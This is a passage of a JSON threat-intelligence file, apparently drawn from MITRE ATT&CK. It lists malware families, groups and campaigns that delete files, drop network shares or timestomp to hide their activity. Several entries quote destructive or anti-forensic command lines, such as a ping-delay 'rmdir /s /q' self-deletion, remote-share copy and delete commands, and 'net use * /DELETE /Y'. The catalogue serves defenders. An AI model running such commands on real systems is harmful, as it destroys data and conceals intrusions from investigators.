                    },
                    "S0211": {
                        "ID": "S0211",
                        "Name": "Linfo",
                        "Description": "<name> creates a backdoor through which remote attackers can delete files.[141]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> can securely delete files by first writing random data to the file.[77]"
                    },
                    "S0372": {
                        "ID": "S0372",
                        "Name": "LockerGoga",
                        "Description": "<name> has been observed deleting its original launcher after execution.[142]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> will delete its dropped files after bypassing UAC.[143]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> removes itself after execution and can delete files on the system.[144]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> deleted installation files after completion.[145]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "Once a file is uploaded, <name> will delete it from the machine.[146]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> can delete itself from the compromised computer.[147]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> deletes any temporary files it creates[148]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has deleted and overwrote files to cover tracks.[149][150][151]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "A <name> macro deletes files after it has decoded and decompressed them.[152][153]"
                    },
                    "S0443": {
                        "ID": "S0443",
                        "Name": "MESSAGETAP",
                        "Description": "Once loaded into memory, <name> deletes the keyword_parm.txt and parm.txt configuration files from disk. [154]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has quickly deleted cbd.exe from a compromised host following the successful deployment of their malware.[155]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has deleted collected items after uploading the content to its C2 server.[155][156]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has deleted itself from the system after execution.[157][158]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> will delete the folder containing malicious scripts if it detects the hostname as PIS-APP, PIS-MOB, WSUSPROXY, or PIS-DB.[159]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can delete files via C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q.[60]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> is capable of deleting the backdoor file.[160]"
                    },
                    "S0149": {
                        "ID": "S0149",
                        "Name": "MoonWind",
                        "Description": "<name> can delete itself or specified files.[161]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> can remove itself from a system.[51][162]"
                    },
                    "S1047": {
                        "ID": "S1047",
                        "Name": "Mori",
                        "Description": "<name> can delete its DLL file and related files by Registry value.[163]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> deletes files using DeleteFileW API call.[164]"
                    },
                    "S0233": {
                        "ID": "S0233",
                        "Name": "MURKYTOP",
                        "Description": "<name> has the capability to delete local files.[65]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> will delete their tools and files, and kill processes after their objectives are reached.[165]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> launches a script to delete their original decoy file to cover tracks.[166]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> has the ability to delete files and directories.[167]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> is capable of deleting files.[168][169]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> can delete files to cover tracks.[170]"
                    },
                    "S0346": {
                        "ID": "S0346",
                        "Name": "OceanSalt",
                        "Description": "<name> can delete files from the system.[171]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has deleted files associated with their payload after execution.[172][173]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s backdoor deletes files after they have been successfully uploaded to C2 servers.[174]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> has the capability to delete files and scripts from the victim's machine.[175]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group removed all previously delivered files from a compromised computer.[176]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.[177]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, the threat actors consistently removed traces of their activity by first overwriting a file using /c cd /d c:\\windows\\temp\\ & copy \\\\<IP ADDRESS>\\c$\\windows\\system32\\devmgr.dll \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1 /y and then deleting the overwritten file using /c cd /d c:\\windows\\temp\\ & del \\\\<IP ADDRESS>\\c$\\windows\\temp\\LMAKSW.ps1.[178]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> has a command to delete a file from the system. <name> deletes the app bundle and dropper after execution.[179][180][181]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> can delete itself following the successful execution of a follow-on payload.[182]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> can delete scripts from a subdirectory of /tmp after they are run.[75]"
                    },
                    "S0208": {
                        "ID": "S0208",
                        "Name": "Pasam",
                        "Description": "<name> creates a backdoor through which remote attackers can delete files.[183]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> removed certain files and replaced them so they could not be retrieved.[184]"
                    },
                    "S0556": {
                        "ID": "S0556",
                        "Name": "Pay2Key",
                        "Description": "<name> can remove its log file from disk.[185]"
                    },
                    "S1050": {
                        "ID": "S1050",
                        "Name": "PcShare",
                        "Description": "<name> has deleted its files and components from a compromised host.[45]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can delete downloaded executables after running them.[186]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> has deleted the filepath %APPDATA%\\Intel\\devmonsrv.exe.[187]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has the ability to delete files on the compromised host.[135]"
                    },
                    "S0067": {
                        "ID": "S0067",
                        "Name": "pngdowner",
                        "Description": "<name> deletes content from C2 communications that was saved to the user's temporary directory.[188]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has the ability to overwrite scripts and delete itself if a sandbox environment is detected.[189]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has used scripts to delete itself after execution.[190]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> has a command to write random data across a file and delete it.[191]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> has the ability to remove all files created during the dropper process.[192]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> can delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives using PowerShell Remove-Item commands.[193]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "After encrypting its own log files, the log encryption module in <name> deletes the original, unencrypted files from the host.[194]"
                    },
                    "S0654": {
                        "ID": "S0654",
                        "Name": "ProLock",
                        "Description": "<name> can remove files containing its payload after they are executed.[195]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> removes all files in the /tmp directory.[86]"
                    },
                    "S0238": {
                        "ID": "S0238",
                        "Name": "Proxysvc",
                        "Description": "<name> can delete files indicated by the attacker and remove itself from disk using a batch file.[139]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.[196]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> can delete files written to disk.[83][197]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> will remove all created artifacts such as dropped executables.[198]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has deleted batch files after execution. [199]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can delete folders and files including overwriting its executable with legitimate programs.[200][201][202][195]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> has a command to delete its Registry key and scheduled task.[203]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> has the ability to uninstall itself by deleting its service and files.[167]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can remove files from a targeted system.[204]"
                    },
                    "S0495": {
                        "ID": "S0495",
                        "Name": "RDAT",
                        "Description": "<name> can issue SOAP requests to delete already processed C2 emails. <name> can also delete itself from the infected system.[205]"
                    },
                    "S0416": {
                        "ID": "S0416",
                        "Name": "RDFSNIFFER",
                        "Description": "<name> has the capability of deleting local files.[206]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> deletes the original dropped file from the victim.[207]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> can delete specified files.[208]"
                    },
                    "S0125": {
                        "ID": "S0125",
                        "Name": "Remsec",
                        "Description": "<name> is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.[209][210][211]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can mark its binary code for deletion after reboot.[212]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> can delete files and artifacts it creates.[213]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has deleted files on infected machines.[214]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> can request to delete files.[215]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can delete all files created during its execution.[216][217]"
                    },
                    "S0253": {
                        "ID": "S0253",
                        "Name": "RunningRAT",
                        "Description": "<name> contains code to delete files from the victim\u2019s machine.[96]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> has deleted files it has created on a compromised host.[160]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> can run a batch script named del.bat to remove any <name> payload-linked files from a compromise system if anti-analysis or locale checks fail.[182]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "Some <name> samples use cmd.exe to delete temporary files.[218]"
                    },
                    "S0370": {
                        "ID": "S0370",
                        "Name": "SamSam",
                        "Description": "<name> has been seen deleting its own files and payloads to make analysis of the attack more difficult.[219]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used backdoors that can delete files used in an attack from an infected system.[131][220]"
                    },
                    "S0461": {
                        "ID": "S0461",
                        "Name": "SDBbot",
                        "Description": "<name> has the ability to delete files from a compromised host.[221]"
                    },
                    "S0195": {
                        "ID": "S0195",
                        "Name": "SDelete",
                        "Description": "<name> deletes data in a way that makes it unrecoverable.[1]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> can securely delete files, including deleting itself from the victim.[222]"
                    },
                    "S0345": {
                        "ID": "S0345",
                        "Name": "Seasalt",
                        "Description": "<name> has a command to delete a specified file.[223]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> has a module to delete itself from the infected machine.[224][225]"
                    },
                    "S1019": {
                        "ID": "S1019",
                        "Name": "Shark",
                        "Description": "<name> can delete files downloaded to the compromised host.[60]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.[226]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> will delete itself if a certain server response is received.[227]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.[228][229]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can remove files from the compromised host.[230]"
                    },
                    "S0533": {
                        "ID": "S0533",
                        "Name": "SLOTHFULMEDIA",
                        "Description": "<name> has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.[231]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 routinely removed their tools, including custom backdoors, once remote access was achieved.[232]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> has the ability to run cancel or closeanddeletestorage to remove all files from storage and delete the storage temp file on a compromised host.[233]"
                    },
                    "S0374": {
                        "ID": "S0374",
                        "Name": "SpeakUp",
                        "Description": "<name> deletes files to remove evidence on the machine. [234]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> has used been observed deleting scripts once used.[235]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> has been observed deleting the temporary files once they fulfill their task.[236]"
                    },
                    "S1034": {
                        "ID": "S1034",
                        "Name": "StrifeWater",
                        "Description": "<name> can self delete to cover its tracks.[237]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can delete previously exfiltrated files from the compromised host.[238][239]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.[240]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> had a command to delete files.[232][241]"
                    },
                    "S0562": {
                        "ID": "S0562",
                        "Name": "SUNSPOT",
                        "Description": "Following the successful injection of SUNBURST, <name> deleted a temporary file it created named InventoryManager.bk after restoring the original SolarWinds Orion source code to the software library.[242]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can delete its configuration file from the targeted system.[243]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> can use DeleteFileA to remove files from infected hosts.[244]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> can delete files from a compromised host.[245]"
                    },
                    "S0164": {
                        "ID": "S0164",
                        "Name": "TDTESS",
                        "Description": "<name> creates then deletes log files during installation of itself as a service.[246]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has used a payload that removes itself after running. <name> also has deleted locally staged files for collecting credentials or scan results for local IP addresses after exfiltrating them.[247][248]"
                    },
                    "G0089": {
                        "ID": "G0089",
                        "Name": "The White Company",
                        "Description": "<name> has the ability to delete its malware entirely from the target system.[249]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has deleted existing logs and exfiltrated file archives from a victim.[250][251]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> has used plugins with a self-delete capability.[252]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has deleted dropper files on an infected system using command scripts.[253]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "<name> can delete files off the system.[254]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can run a Clear Agents Track command on an infected machine to delete <name>-related logs.[255]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has deleted data staged in tmp files after exfiltration.[256]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> has several commands to delete files associated with the malware from the victim.[257]"
                    },
                    "S0442": {
                        "ID": "S0442",
                        "Name": "VBShower",
                        "Description": "<name> has attempted to complicate forensic analysis by deleting all the files contained in %APPDATA%..\\Local\\Temporary Internet Files\\Content.Word and %APPDATA%..\\Local Settings\\Temporary Internet Files\\Content.Word\\.[258]"
                    },
                    "S0257": {
                        "ID": "S0257",
                        "Name": "VERMIN",
                        "Description": "<name> can delete files on the victim\u2019s machine.[259]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "<name> can delete files and itself after infection to avoid analysis.[260]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has run rd /S to delete their working directories and files.[261]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can delete tools from a compromised host after execution.[262]"
                    },
                    "S0155": {
                        "ID": "S0155",
                        "Name": "WINDSHIELD",
                        "Description": "<name> is capable of file deletion along with other file system interaction.[263]"
                    },
                    "S0466": {
                        "ID": "S0466",
                        "Name": "WindTail",
                        "Description": "<name> has the ability to receive and execute a self-delete command.[264]"
                    },
                    "S0176": {
                        "ID": "S0176",
                        "Name": "Wingbird",
                        "Description": "<name> deletes its payload along with the payload's parent process after it finishes copying files.[265]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can delete the DLLs for its various components from a compromised host.[266]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used file deletion to remove some modules and configurations from an infected host after use.[267]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> has the ability to delete itself from disk by creating a suspended notepad process and writing shellcode to delete a file into the suspended process using NtWriteVirtualMemory.[268]"
                    },
                    "S0161": {
                        "ID": "S0161",
                        "Name": "XAgentOSX",
                        "Description": "<name> contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.[269]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> has a command to delete files and directories.[270][271][272]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> has a command to delete a file. It also can uninstall scripts and delete files to cover its track.[273]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> has deleted itself after creating a service as well as deleted a temporary file when the system reboots.[274]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> can delete files from the system.[15][275]"
                    }
                }
            },
            "005": {
                "name": "Network Share Connection Removal",
                "href": "/techniques/T1070/005",
                "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \\system\\share /delete command. [1]",
                "Procedure": {
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can disconnect previously connected remote drives.[2]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "The net use \\system\\share /delete command can be used in <name> to remove an established connection to a network share.[1]"
                    },
                    "S0400": {
                        "ID": "S0400",
                        "Name": "RobbinHood",
                        "Description": "<name> disconnects all network shares from the computer with the command net use * /DELETE /Y.[3]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has detached network shares after exfiltrating files, likely to evade detection.[4]"
                    }
                }
            },
            "006": {
                "name": "Timestomp",
                "href": "/techniques/T1070/006",
                "description": "Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.Timestomping may be used along with file name Masquerading to hide malware and tools.[1]",
                "Procedure": {
                    "S0066": {
                        "ID": "S0066",
                        "Name": "3PARA RAT",
                        "Description": "<name> has a command to set certain attributes such as creation/modification timestamps on files.[2]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has performed timestomping on victim files.[3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used timestomping to alter the Standard Information timestamps on their web shells to match other files in the same directory.[4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally, <name> has used a random value to modify the timestamp of the file storing the clientID.[5][6][7]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has modified data timestamps to mimic files that are in the same folder on a compromised host.[8]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has modified file timestamps.[9]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> has manipulated the time of last access to files and registry keys after they have been created or modified.[10]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> modifies the time of a file as specified by the control server.[11]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.[12]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has modified file and directory timestamps.[13][14]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.[15]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs.[16]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s server component can change the timestamp of files.[17][18][19]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can timestomp any files or payloads placed on a target machine to help them blend in.[20][21]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors changed timestamps of multiple files on compromised Ivanti Secure Connect VPNs to conceal malicious activity.[22][23]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> has the ability to use the Linux API function utime to change the timestamps of modified firmware update images.[24]"
                    },
                    "S0021": {
                        "ID": "S0021",
                        "Name": "Derusbi",
                        "Description": "The <name> malware supports timestomping.[25][26]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "<name> performs timestomping of a CAB file it creates.[27]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can timestomp any files or payloads placed on a target machine to help them blend in.[28]"
                    },
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> has changed the creation date of files.[29]"
                    },
                    "S0181": {
                        "ID": "S0181",
                        "Name": "FALLCHILL",
                        "Description": "<name> can modify file or directory timestamps.[30]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "For early <name> versions, the compilation timestamp was faked.[31]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> has the ability to perform timestomping of files on targeted systems.[32]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> samples were timestomped by the authors by setting the PE timestamps to all zero values. <name> also has a built-in command to modify file times.[33]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> time-stomped its DLL in order to evade detection.[34]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has manipulated timestamps for creation or compilation dates to defeat anti-forensics.[35]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name> can modify timestamps of replaced files, such as ssh with the added credential stealer or sshd used to deploy <name>.[36]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "Several <name> malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.[37][38][39][40]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> has the capability to create and modify file timestamps.[41]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> can change the CreationTime, LastAccessTime, and LastWriteTime file time attributes when executed with SYSTEM privileges.[42]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "Many <name> samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.[43]"
                    },
                    "S1090": {
                        "ID": "S1090",
                        "Name": "NightClub",
                        "Description": "<name> can modify the Creation, Access, and Write timestamps for malicious DLLs to match those of the genuine Windows DLL user32.dll.[44]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can change or create the last access or write times.[45]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> can use the touch -t command to change timestamps.[46][47]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> has a command to timestop a file or directory.[48]"
                    },
                    "S1031": {
                        "ID": "S1031",
                        "Name": "PingPull",
                        "Description": "<name> has the ability to timestomp a file.[49]"
                    },
                    "S0150": {
                        "ID": "S0150",
                        "Name": "POSHSPY",
                        "Description": "<name> modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.[50]"
                    },
                    "S0393": {
                        "ID": "S0393",
                        "Name": "PowerStallion",
                        "Description": "<name> modifies the MAC times of its local log files to match that of the victim's desktop.ini file.[51]"
                    },
                    "S0078": {
                        "ID": "S0078",
                        "Name": "Psylo",
                        "Description": "<name> has a command to conduct timestomping by setting a specified file\u2019s timestamps to match those of a system file in the System32 directory.[52]"
                    },
                    "G0106": {
                        "ID": "G0106",
                        "Name": "Rocke",
                        "Description": "<name> has changed the time stamp of certain files.[53]"
                    },
                    "S0185": {
                        "ID": "S0185",
                        "Name": "SEASHARPEE",
                        "Description": "<name> can timestomp files on victims using a Web shell.[54]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> can change the modified time for files to evade forensic detection.[55]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 modified timestamps of backdoors to match legitimate Windows files.[56]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> extracts and writes driver files that match the times of other legitimate files.[57]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> can change the timestamp of specified filenames.[58]"
                    },
                    "S0164": {
                        "ID": "S0164",
                        "Name": "TDTESS",
                        "Description": "After creating a new service for persistence, <name> sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.[59]"
                    },
                    "S0136": {
                        "ID": "S0136",
                        "Name": "USBStealer",
                        "Description": "<name> sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.[60]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can set the timestamps for its worker and service components to match that of cmd.exe.[61]"
                    }
                }
            },
            "007": {
                "name": "Clear Network Connection History and Configurations",
                "href": "/techniques/T1070/007",
